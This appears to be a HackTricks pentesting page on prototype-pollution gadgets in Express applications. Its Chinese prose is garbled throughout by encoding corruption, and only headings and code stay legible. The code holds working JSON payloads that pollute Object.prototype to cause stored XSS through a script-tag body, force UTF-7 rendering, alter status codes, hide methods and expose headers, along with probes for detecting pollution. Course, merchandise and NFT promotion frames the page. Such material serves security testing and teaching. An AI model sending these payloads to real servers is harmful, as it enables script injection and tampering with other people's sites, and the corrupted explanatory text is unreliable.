# Express åŸå‹æ±¡æŸ“å°å·¥å…·

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ **HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF ç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFT é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ä»¬ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
## æä¾› XSS å“åº”

### å°† JSON å†…å®¹ç±»å‹æ›´æ”¹ä¸º HTML

åœ¨ä½¿ç”¨ **JSON å†…å®¹ç±»å‹å“åº”** å¹¶åæ˜  JSON çš„ Express åº”ç”¨ä¸­ï¼š
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
åœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œé€šå¸¸åœ¨JSONå†…å®¹ç±»å‹ä¸­ä¸å¯èƒ½å‡ºç°XSSã€‚ç„¶è€Œï¼Œé€šè¿‡åŸå‹æ±¡æŸ“ï¼Œæˆ‘ä»¬å¯ä»¥**è¿·æƒ‘Expressä»¥æä¾›HTMLå“åº”ã€‚** è¿™ä¸ªæ¼æ´ä¾èµ–äºåº”ç”¨ç¨‹åºä½¿ç”¨**`res.send(obj)`** å¹¶ä¸”ä½¿ç”¨application/jsonå†…å®¹ç±»å‹çš„bodyè§£æå™¨ã€‚
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
é€šè¿‡åŒæ—¶æ±¡æŸ“ **`body`** å’Œ **`_body`** å±æ€§ï¼Œå¯ä»¥å¯¼è‡´ **Express æä¾› HTML å†…å®¹ç±»å‹** å¹¶åæ˜  `_body` å±æ€§ï¼Œå¯¼è‡´å­˜å‚¨å‹ XSSã€‚

### æ¸²æŸ“ UTF7

å¯ä»¥ä½¿ express **æ¸²æŸ“ UTF-7 å†…å®¹**ï¼š
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## å®‰å…¨æ‰«ææŠ€æœ¯

### JSON ç©ºæ ¼

ä»¥ä¸‹ PP å°†ä½¿ JSON å†…çš„å±æ€§å¤šå‡ºä¸€ä¸ªç©ºæ ¼ï¼Œè¿™ä¸ä¼šç ´ååŠŸèƒ½æ€§ï¼š
```json
{"__proto__":{"json spaces": " "}}
```
é‚£ä¹ˆåå°„çš„JSONå°†çœ‹èµ·æ¥åƒï¼š
```json
{"foo":  "bar"} -- Note the extra space
```
### æš´éœ²çš„å¤´éƒ¨

ä»¥ä¸‹PPå°å·¥å…·å°†ä½¿æœåŠ¡å™¨å‘é€å›HTTPå¤´éƒ¨ï¼š**`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
å®ƒéœ€è¦**å®‰è£…CORSæ¨¡å—**

### **OPTIONS æ–¹æ³•**

ä½¿ç”¨ä»¥ä¸‹æœ‰æ•ˆè½½è·ï¼Œå¯ä»¥**ä»OPTIONSå“åº”ä¸­éšè—æ–¹æ³•**ï¼š
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **çŠ¶æ€**

å¯ä»¥ä½¿ç”¨ä»¥ä¸‹PPæœ‰æ•ˆè½½è·æ›´æ”¹**è¿”å›çŠ¶æ€ç **ï¼š
```json
{"__proto__":{"status":510}}
```
### é”™è¯¯

å½“æ‚¨ä½¿ç”¨å¦‚å­—ç¬¦ä¸²è¿™æ ·çš„åŸå§‹å€¼ç»™åŸå‹èµ‹å€¼æ—¶ï¼Œå®ƒä¼šäº§ç”Ÿä¸€ä¸ª**æ— æ“ä½œï¼Œå› ä¸ºåŸå‹å¿…é¡»æ˜¯ä¸€ä¸ªå¯¹è±¡**ã€‚å¦‚æœæ‚¨å°è¯•å°†ä¸€ä¸ªåŸå‹å¯¹è±¡èµ‹ç»™`Object.prototype`æœ¬èº«ï¼Œè¿™å°†ä¼š**æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸**ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸¤ç§è¡Œä¸ºæ¥**æ£€æµ‹åŸå‹æ±¡æŸ“æ˜¯å¦æˆåŠŸ**ï¼š
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### åå°„å€¼

å¦‚æœåº”ç”¨ç¨‹åºåœ¨å“åº”ä¸­åæ˜ äº†ä¸€ä¸ªå¯¹è±¡ï¼Œæ‚¨å¯ä»¥åˆ›å»ºä¸€ä¸ªå¸¦æœ‰**å¥‡æ€ªåç§°å’Œ `__proto__`** çš„å±æ€§ï¼Œå¦‚æœ**åªæœ‰å¥‡æ€ªçš„åç§°è¢«åæ˜ **ï¼Œé‚£ä¹ˆè¿™ä¸ªç½‘ç«™å¯èƒ½æ˜¯è„†å¼±çš„ï¼š
```json
{"hacktricks":"rocks","__proto__":"test"}
```
å¦‚æœä½¿ç”¨äº† Lodash æˆ–ç±»ä¼¼åº“ï¼Œä½ å¯ä»¥**é€šè¿‡ PP è®¾ç½®å¯¹è±¡å†…éƒ¨çš„å±æ€§**ï¼Œå¦‚æœè¯¥å±æ€§æ²¡æœ‰åæ˜ å‡ºæ¥ï¼Œé‚£æ˜¯å› ä¸º Lodash ä¼šæ£€æŸ¥å½“å‰å¯¹è±¡ï¼Œçœ‹çœ‹è¯¥å±æ€§æ˜¯å¦å·²ç»å­˜åœ¨äºåˆå¹¶åçš„å¯¹è±¡ä¸­ï¼š
```javascript
{"__proto__":{"a":"asd"},"a":"asd2","b":"dfg"}
// If only b is reflected then PP in Lodash
```
## æ‚é¡¹

### å…è®¸ç‚¹å·

Express ä¸­æœ‰ä¸€ä¸ªé€‰é¡¹å¯ä»¥è®©ä½ **ä»æŸ¥è¯¢å­—ç¬¦ä¸²å‚æ•°åˆ›å»ºå¯¹è±¡**ã€‚\
ä½ ç»å¯¹å¯ä»¥åœ¨æ¼æ´**é“¾**ä¸­åˆ©ç”¨å®ƒæ¥æ”»å‡»**åŸå‹æ±¡æŸ“æ¼æ´**ã€‚
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` åœ¨ Node ä¸­åˆ›å»ºä¸€ä¸ªå¯¹è±¡ã€‚**

## å‚è€ƒèµ„æ–™

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºä¸“å®¶ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFT é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ä»¬ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
